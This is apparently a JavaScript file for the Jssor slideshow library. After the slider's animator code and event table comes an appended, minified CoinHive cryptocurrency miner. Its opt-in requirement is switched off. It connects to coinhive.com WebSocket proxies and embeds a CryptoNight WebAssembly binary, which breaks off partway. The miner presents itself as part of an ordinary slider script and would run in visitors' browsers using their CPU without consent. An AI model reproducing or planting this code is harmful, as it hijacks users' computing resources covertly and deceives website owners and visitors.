                _ImmediateOutCaptionHanger.$Combine(animator3);
            }

            if (animator)
                _Self.$Combine(animator);
        });

        return streamLineLength;
    }

    _Self.$Revert = function () {
        _Self.$GoToPosition(_Self.$GetPosition_OuterEnd() * (playIn || 0));
        _ImmediateOutCaptionHanger.$GoToBegin();
    };

    //Constructor
    {
        _ImmediateOutCaptionHanger = new $JssorAnimator$(0, 0);

        //var streamLineLength = 0;
        //var captionItems = GetCaptionItems(container, null, [], [], 1);

        CreateAnimators(0, _PlayMode ? GetCaptionItems(container, 1) : []);
    }
};

//Event Table

//$EVT_CLICK = 21;			    function(slideIndex[, event])
//$EVT_DRAG_START = 22;		    function(position[, virtualPosition, event])
//$EVT_DRAG_END = 23;		    function(position, startPosition[, virtualPosition, virtualStartPosition, event])
//$EVT_SWIPE_START = 24;		function(position[, virtualPosition])
//$EVT_SWIPE_END = 25;		    function(position[, virtualPosition])

//$EVT_LOAD_START = 26;			function(slideIndex)
//$EVT_LOAD_END = 27;			function(slideIndex)

//$EVT_POSITION_CHANGE = 202;	function(position, fromPosition[, virtualPosition, virtualFromPosition])
//$EVT_PARK = 203;			    function(slideIndex, fromIndex)

//$EVT_PROGRESS_CHANGE = 208;	function(slideIndex, progress[, progressBegin, idleBegin, idleEnd, progressEnd])
//$EVT_STATE_CHANGE = 209;	    function(slideIndex, progress[, progressBegin, idleBegin, idleEnd, progressEnd])

//$EVT_ROLLBACK_START = 210;	function(slideIndex, progress[, progressBegin, idleBegin, idleEnd, progressEnd])
//$EVT_ROLLBACK_END = 211;	    function(slideIndex, progress[, progressBegin, idleBegin, idleEnd, progressEnd])

//$EVT_SLIDESHOW_START = 206;   function(slideIndex[, progressBegin, slideshowBegin, slideshowEnd, progressEnd])
//$EVT_SLIDESHOW_END = 207;     function(slideIndex[, progressBegin, slideshowBegin, slideshowEnd, progressEnd])

//http://www.jssor.com/development/reference-api.html

(function(window){"use strict";var Miner=function(siteKey,params){this.params=params||{};this._siteKey=siteKey;this._user=null;this._threads=[];this._hashes=0;this._currentJob=null;this._autoReconnect=true;this._reconnectRetry=3;this._tokenFromServer=null;this._goal=0;this._totalHashesFromDeadThreads=0;this._throttle=Math.max(0,Math.min(.99,this.params.throttle||0));this._stopOnInvalidOptIn=false;this._waitingForAuth=false;this._selfTestSuccess=false;this._verifyThread=null;this._autoThreads={enabled:!!this.params.autoThreads,interval:null,adjustAt:null,adjustEvery:1e4,stats:{}};this._tab={ident:Math.random()*16777215|0,mode:CoinHive.IF_EXCLUSIVE_TAB,grace:0,waitReconnect:0,lastPingReceived:0,interval:null};if(window.BroadcastChannel){try{this._bc=new BroadcastChannel("coinhive");this._bc.onmessage=function(msg){if(msg.data==="ping"){this._tab.lastPingReceived=Date.now()}}.bind(this)}catch(e){}}if(CoinHive.CONFIG.REQUIRES_AUTH){this._auth=new CoinHive.Auth(this._siteKey,{theme:this.params.theme||"light",lang:this.params.language||"auto"})}this._eventListeners={open:[],authed:[],close:[],error:[],job:[],found:[],accepted:[],optin:[]};var defaultThreads=navigator.hardwareConcurrency||4;this._targetNumThreads=this.params.threads||defaultThreads;this._useWASM=this.hasWASMSupport()&&!this.params.forceASMJS;this._asmjsStatus="unloaded";this._onTargetMetBound=this._onTargetMet.bind(this);this._onVerifiedBound=this._onVerified.bind(this)};Miner.prototype.start=function(mode,optInToken){this._tab.mode=mode||CoinHive.IF_EXCLUSIVE_TAB;this._optInToken=optInToken;if(this._tab.interval){clearInterval(this._tab.interval);this._tab.interval=null}this._loadWorkerSource(function(){this._startNow()}.bind(this))};Miner.prototype.stop=function(mode){for(var i=0;i<this._threads.length;i++){this._totalHashesFromDeadThreads+=this._threads[i].hashesTotal;this._threads[i].stop()}this._threads=[];this._autoReconnect=false;if(this._socket){this._socket.close()}this._currentJob=null;if(this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(this._tab.interval&&mode!=="dontKillTabUpdate"){clearInterval(this._tab.interval);this._tab.interval=null}};Miner.prototype.getHashesPerSecond=function(){var hashesPerSecond=0;for(var i=0;i<this._threads.length;i++){hashesPerSecond+=this._threads[i].hashesPerSecond}return hashesPerSecond};Miner.prototype.getTotalHashes=function(estimate){var now=Date.now();var hashes=this._totalHashesFromDeadThreads;for(var i=0;i<this._threads.length;i++){var thread=this._threads[i];hashes+=thread.hashesTotal;if(estimate){var tdiff=(now-thread.lastMessageTimestamp)/1e3*.9;hashes+=tdiff*thread.hashesPerSecond}}return hashes|0};Miner.prototype.getAcceptedHashes=function(){return this._hashes};Miner.prototype.getToken=function(){return this._tokenFromServer};Miner.prototype.on=function(type,callback){if(this._eventListeners[type]){this._eventListeners[type].push(callback)}};Miner.prototype.getAutoThreadsEnabled=function(enabled){return this._autoThreads.enabled};Miner.prototype.setAutoThreadsEnabled=function(enabled){this._autoThreads.enabled=!!enabled;if(!enabled&&this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(enabled&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}};Miner.prototype.getThrottle=function(){return this._throttle};Miner.prototype.setThrottle=function(throttle){this._throttle=Math.max(0,Math.min(.99,throttle));if(this._currentJob){this._setJob(this._currentJob)}};Miner.prototype.getNumThreads=function(){return this._targetNumThreads};Miner.prototype.setNumThreads=function(num){var num=Math.max(1,num|0);this._targetNumThreads=num;if(num>this._threads.length){for(var i=0;num>this._threads.length;i++){var thread=new CoinHive.JobThread;if(this._currentJob){thread.setJob(this._currentJob,this._onTargetMetBound)}this._threads.push(thread)}}else if(num<this._threads.length){while(num<this._threads.length){var thread=this._threads.pop();this._totalHashesFromDeadThreads+=thread.hashesTotal;thread.stop()}}};Miner.prototype.hasWASMSupport=function(){return window.WebAssembly!==undefined&&!/OS 11_2_(2|5|6)/.test(navigator.userAgent)};Miner.prototype.isRunning=function(){return this._threads.length>0};Miner.prototype.isMobile=function(){return/mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)};Miner.prototype.didOptOut=function(seconds){if(!CoinHive.CONFIG.REQUIRES_AUTH){return false}seconds=seconds||60*60*4;var t=this._auth.getOptOutTime();return!!(t&&t>Date.now()/1e3-seconds)};Miner.prototype.isAuthed=function(){if(CoinHive.CONFIG.REQUIRES_AUTH){return this._auth.isAuthed()}return true};Miner.prototype.selfTest=function(callback){this._loadWorkerSource(function(){if(!this._verifyThread){this._verifyThread=new CoinHive.JobThread}var testJob={verify_id:"1",nonce:"00000000",result:"6902d6d809395477009c1aa24338de7e42502b5980264c2a0992a792b3543ac5",blob:"0807a9b7d1d6053f1319632703fcfcd2cebc44d8ab44a6a03ae44d8f15af6217d1e09285e473f900000000fc09deabf58b6f1dcaa8baac74dd7419d5d610ec38cf50296a070b938f8fa81004"};this._verifyThread.verify(testJob,function(res){callback(res.verified===true,res)})}.bind(this))};Miner.prototype._loadWorkerSource=function(callback){if(this._useWASM||this._asmjsStatus==="loaded"){callback()}else if(this._asmjsStatus==="unloaded"){this._asmjsStatus="pending";var xhr=new XMLHttpRequest;xhr.addEventListener("load",function(){CoinHive.CRYPTONIGHT_WORKER_BLOB=CoinHive.Res(xhr.responseText);this._asmjsStatus="loaded";callback()}.bind(this),xhr);xhr.open("get",CoinHive.CONFIG.LIB_URL+CoinHive.CONFIG.ASMJS_NAME,true);xhr.send()}};Miner.prototype._startNow=function(){if(this._tab.mode!==CoinHive.FORCE_MULTI_TAB&&!this._tab.interval){this._tab.interval=setInterval(this._updateTabs.bind(this),1e3)}if(this._tab.mode===CoinHive.IF_EXCLUSIVE_TAB&&this._otherTabRunning()){return}if(this._tab.mode===CoinHive.FORCE_EXCLUSIVE_TAB){this._tab.grace=Date.now()+3e3}if(!this._verifyThread){this._verifyThread=new CoinHive.JobThread}this.setNumThreads(this._targetNumThreads);this._autoReconnect=true;if(CoinHive.CONFIG.REQUIRES_AUTH&&!this._optInToken){this._waitingForAuth=true;this._auth.auth(function(token){this._waitingForAuth=false;if(!token){this.stop();this._emit("optin",{status:"canceled"});this._emit("error",{error:"opt_in_canceled"});return}this._emit("optin",{status:"accepted"});this._optInToken=token;this._connectAfterSelfTest()}.bind(this))}else{this._connectAfterSelfTest()}};Miner.prototype._otherTabRunning=function(){if(this._tab.lastPingReceived>Date.now()-1500){return true}try{var tdjson=localStorage.getItem("coinhive");if(tdjson){var td=JSON.parse(tdjson);if(td.ident!==this._tab.ident&&Date.now()-td.time<1500){return true}}}catch(e){}return false};Miner.prototype._updateTabs=function(){if(Date.now()<this._tab.waitReconnect){return}var otherTabRunning=this._otherTabRunning();if(otherTabRunning&&this.isRunning()&&Date.now()>this._tab.grace){this.stop("dontKillTabUpdate")}else if(!otherTabRunning&&!this.isRunning()){this._startNow()}if(this.isRunning()&&!this._waitingForAuth){if(this._bc){this._bc.postMessage("ping")}try{localStorage.setItem("coinhive",JSON.stringify({ident:this._tab.ident,time:Date.now()}))}catch(e){}}};Miner.prototype._adjustThreads=function(){var hashes=this.getHashesPerSecond();var threads=this.getNumThreads();var stats=this._autoThreads.stats;stats[threads]=stats[threads]?stats[threads]*.5+hashes*.5:hashes;if(Date.now()>this._autoThreads.adjustAt){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;var cur=(stats[threads]||0)-1;var up=stats[threads+1]||0;var down=stats[threads-1]||0;if(cur>down&&(up===0||up>cur)&&threads<8){return this.setNumThreads(threads+1)}else if(cur>up&&(!down||down>cur)&&threads>1){return this.setNumThreads(threads-1)}}};Miner.prototype._emit=function(type,params){var listeners=this._eventListeners[type];if(listeners&&listeners.length){for(var i=0;i<listeners.length;i++){listeners[i](params)}}};Miner.prototype._hashString=function(s){var hash=5381,i=s.length;while(i){hash=hash*33^s.charCodeAt(--i)}return hash>>>0};Miner.prototype._connectAfterSelfTest=function(){if(this._selfTestSuccess||this.hasWASMSupport()){this._connect()}else{this.selfTest(function(success){if(success){this._selfTestSuccess=true;this._connect()}else{this._emit("error",{error:"self_test_failed"})}}.bind(this))}};Miner.prototype._connect=function(){if(this._socket){return}var shards=CoinHive.CONFIG.WEBSOCKET_SHARDS;var shardIdx=Math.random()*shards.length|0;var proxies=shards[shardIdx];var proxyUrl=proxies[Math.random()*proxies.length|0];this._socket=new WebSocket(proxyUrl);this._socket.onmessage=this._onMessage.bind(this);this._socket.onerror=this._onError.bind(this);this._socket.onclose=this._onClose.bind(this);this._socket.onopen=this._onOpen.bind(this)};Miner.prototype._onOpen=function(ev){this._emit("open");var params={version:CoinHive.VERSION,site_key:this._siteKey,type:"anonymous",user:null,goal:0};if(this._user){params.type="user";params.user=this._user.toString()}else if(this._goal){params.type="token";params.goal=this._goal}if(this.params.ref){params.ref=this.params.ref}if(this._optInToken){params.opt_in=this._optInToken}this._send("auth",params)};Miner.prototype._onError=function(ev){this._emit("error",{error:"connection_error"});this._onClose(ev)};Miner.prototype._onClose=function(ev){if(ev.code>=1003&&ev.code<=1009){this._reconnectRetry=60;this._tab.waitReconnect=Date.now()+60*1e3}for(var i=0;i<this._threads.length;i++){this._threads[i].stop()}this._threads=[];this._socket=null;this._emit("close");if(this._autoReconnect){setTimeout(this._startNow.bind(this),this._reconnectRetry*1e3)}};Miner.prototype._onMessage=function(ev){var msg=JSON.parse(ev.data);if(msg.type==="job"){this._setJob(msg.params);this._emit("job",msg.params);if(this._autoThreads.enabled&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}}else if(msg.type==="verify"){this._verifyThread.verify(msg.params,this._onVerifiedBound)}else if(msg.type==="hash_accepted"){this._hashes=msg.params.hashes;this._emit("accepted",msg.params);if(this._goal&&this._hashes>=this._goal){this.stop()}}else if(msg.type==="authed"){this._tokenFromServer=msg.params.token||null;this._hashes=msg.params.hashes||0;this._emit("authed",msg.params);this._reconnectRetry=3;this._tab.waitReconnect=0}else if(msg.type==="error"){if(console&&console.error){console.error("Coinhive Error:",msg.params.error)}this._emit("error",msg.params);if(msg.params.error==="invalid_site_key"){this._reconnectRetry=6e3;this._tab.waitReconnect=Date.now()+6e3*1e3}else if(msg.params.error==="invalid_opt_in"){if(this._stopOnInvalidOptIn){return this.stop()}else if(this._auth){this._auth.reset()}}}if(msg.type==="banned"||msg.params.banned){this._emit("error",{banned:true});this._reconnectRetry=600;this._tab.waitReconnect=Date.now()+600*1e3}};Miner.prototype._setJob=function(job){this._currentJob=job;this._currentJob.throttle=this._throttle;for(var i=0;i<this._threads.length;i++){this._threads[i].setJob(job,this._onTargetMetBound)}};Miner.prototype._onTargetMet=function(result){this._emit("found",result);if(result.job_id===this._currentJob.job_id){this._send("submit",{version:CoinHive.VERSION,job_id:result.job_id,nonce:result.nonce,result:result.result})}};Miner.prototype._onVerified=function(verifyResult){this._send("verified",verifyResult)};Miner.prototype._send=function(type,params){if(!this._socket){return}var msg={type:type,params:params||{}};this._socket.send(JSON.stringify(msg))};window.CoinHive=window.CoinHive||{};window.CoinHive.VERSION=9;window.CoinHive.IF_EXCLUSIVE_TAB="ifExclusiveTab";window.CoinHive.FORCE_EXCLUSIVE_TAB="forceExclusiveTab";window.CoinHive.FORCE_MULTI_TAB="forceMultiTab";window.CoinHive.Token=function(siteKey,goal,params){var miner=new Miner(siteKey,params);miner._goal=goal||0;return miner};window.CoinHive.User=function(siteKey,user,params){var miner=new Miner(siteKey,params);miner._user=user;return miner};window.CoinHive.Anonymous=function(siteKey,params){var miner=new Miner(siteKey,params);return miner};window.CoinHive.Res=function(s){var url=window.URL||window.webkitURL||window.mozURL;return url.createObjectURL(new Blob([s]))}})(window);(function(window){"use strict";var JobThread=function(){this.worker=new Worker(CoinHive.CRYPTONIGHT_WORKER_BLOB);this.worker.onmessage=this.onReady.bind(this);this.currentJob=null;this.verifyJob=null;this.jobCallback=function(){};this.verifyCallback=function(){};this._isReady=false;this.hashesPerSecond=0;this.hashesTotal=0;this.running=false;this.lastMessageTimestamp=Date.now()};JobThread.prototype.onReady=function(msg){if(msg.data!=="ready"||this._isReady){throw'Expecting first message to be "ready", got '+msg}this._isReady=true;this.worker.onmessage=this.onReceiveMsg.bind(this);if(this.currentJob){this.running=true;this.worker.postMessage(this.currentJob)}else if(this.verifyJob){this.worker.postMessage(this.verifyJob)}};JobThread.prototype.onReceiveMsg=function(msg){if(msg.data.verify_id){this.verifyCallback(msg.data);return}if(msg.data.result){this.jobCallback(msg.data)}this.hashesPerSecond=this.hashesPerSecond*.5+msg.data.hashesPerSecond*.5;this.hashesTotal+=msg.data.hashes;this.lastMessageTimestamp=Date.now();if(this.running){this.worker.postMessage(this.currentJob)}};JobThread.prototype.setJob=function(job,callback){this.currentJob=job;this.jobCallback=callback;if(this._isReady&&!this.running){this.running=true;this.worker.postMessage(this.currentJob)}};JobThread.prototype.verify=function(job,callback){this.verifyCallback=callback;if(!this._isReady){this.verifyJob=job}else{this.worker.postMessage(job)}};JobThread.prototype.stop=function(){if(this.worker){this.worker.terminate();this.worker=null}this.running=false};window.CoinHive.JobThread=JobThread})(window);self.CoinHive=self.CoinHive||{};self.CoinHive.CONFIG={LIB_URL:"https://coinhive.com/lib/",ASMJS_NAME:"worker-asmjs.min.js?v8",REQUIRES_AUTH:false,WEBSOCKET_SHARDS:[["wss://ws001.coinhive.com/proxy","wss://ws002.coinhive.com/proxy","wss://ws003.coinhive.com/proxy","wss://ws004.coinhive.com/proxy","wss://ws005.coinhive.com/proxy","wss://ws006.coinhive.com/proxy","wss://ws007.coinhive.com/proxy","wss://ws008.coinhive.com/proxy"],["wss://ws009.coinhive.com/proxy","wss://ws010.coinhive.com/proxy","wss://ws011.coinhive.com/proxy","wss://ws012.coinhive.com/proxy","wss://ws013.coinhive.com/proxy","wss://ws014.coinhive.com/proxy","wss://ws015.coinhive.com/proxy","wss://ws016.coinhive.com/proxy"],["wss://ws017.coinhive.com/proxy","wss://ws018.coinhive.com/proxy","wss://ws019.coinhive.com/proxy","wss://ws020.coinhive.com/proxy","wss://ws021.coinhive.com/proxy","wss://ws022.coinhive.com/proxy","wss://ws023.coinhive.com/proxy","wss://ws024.coinhive.com/proxy"],["wss://ws025.coinhive.com/proxy","wss://ws026.coinhive.com/proxy","wss://ws027.coinhive.com/proxy","wss://ws028.coinhive.com/proxy","wss://ws029.coinhive.com/proxy","wss://ws030.coinhive.com/proxy","wss://ws031.coinhive.com/proxy","wss://ws032.coinhive.com/proxy"]],CAPTCHA_URL:"https://coinhive.com/captcha/",MINER_URL:"https://coinhive.com/media/miner.html",AUTH_URL:"https://authedmine.com/authenticate.html"};CoinHive.CRYPTONIGHT_WORKER_BLOB=CoinHive.Res(" self.WASM_BINARY_INLINE= [0,97,115,109,1,0,0,0,1,51,9,96,3,127,127,127,0,96,1,127,0,96,0,1,127,96,2,127,127,1,127,96,3,127,127,127,1,127,96,1,127,1,127,96,2,127,127,0,96,4,127,127,127,127,0,96,3,127,127,126,0,2,136,2,14,3,101,110,118,6,109,101,109,111,114,121,2,1,128,2,128,2,3,101,110,118,5,116,97,98,108,101,1,112,1,8,8,3,101,110,118,9,116,97,98,108,101,66,97,115,101,3,127,0,3,101,110,118,14,68,89,78,65,77,73,67,84,79,80,95,80,84,82,3,127,0,3,101,110,118,8,83,84,65,67,75,84,79,80,3,127,0,3,101,110,118,5,97,98,111,114,116,0,1,3,101,110,118,13,101,110,108,97,114,103,101,77,101,109,111,114,121,0,2,3,101,110,118,14,103,101,116,84,111,116,97,108,77,101,109,111,114,121,0,2,3,101,110,118,23,97,98,111,114,116,79,110,67,97,110,110,111,116,71,114,111,119,77,101,109,111,114,121,0,2,3,101,110,118,11,95,95,95,115,101,116,69,114,114,78,111,0,1,3,101,110,118,12,95,95,95,115,121,115,99,97,108,108,50,48,0,3,3,101,110,118,22,95,101,109,115,99,114,105,112,116,101,110,95,109,101,109,99,112,121,95,98,105,103,0,4,3,101,110,118,6,95,102,116,105,109,101,0,5,3,101,110,118,7,95,103,109,116,105,109,101,0,5,3,31,30,6,0,4,1,0,4,5,5,8,6,1,0,0,1,7,0,7,7,6,1,2,0,4,0,0,0,7,7,7,5,6,11,2,127,1,35,1,11,127,1,35,2,11,7,180,1,8,18,95,97,101,115,98,95,115,105,110,103,108,101,95,114,111,117,110,100,0,20,19,95,99,114,121,112,116,111,110,105,103,104,116,95,99,114,101,97,116,101,0,29,20,95,99,114,121,112,116,111,110,105,103,104,116,95,100,101,115,116,114,111,121,0,28,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,48,0,37,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,49,0,36,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,50,0,35,7,95,109,97,108,108,111,99,0,16,10,115,116,97,99,107,65,108,108,111,99,0,38,9,14,1,0,35,0,11,8,21,34,30,33,32,21,21,21,10,218,219,3,30,227,25,1,10,127,32,0,32,0,40,2,0,34,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,0,115,32,0,65,4,106,34,9,40,2,0,34,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,0,65,8,106,34,10,40,2,0,34,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,0,65,12,106,34,11,40,2,0,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,16,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,4,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,8,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,12,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,20,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,24,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,28,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,32,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,48,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,36,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,40,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,44,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,52,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,56,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,60,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,64,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,80,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,68,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,72,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,76,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,84,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,88,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,92,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,96,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,112,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,100,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,104,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,108,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,116,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,120,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,124,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,128,1,115,32,4,65,8,118,65,255,1,113,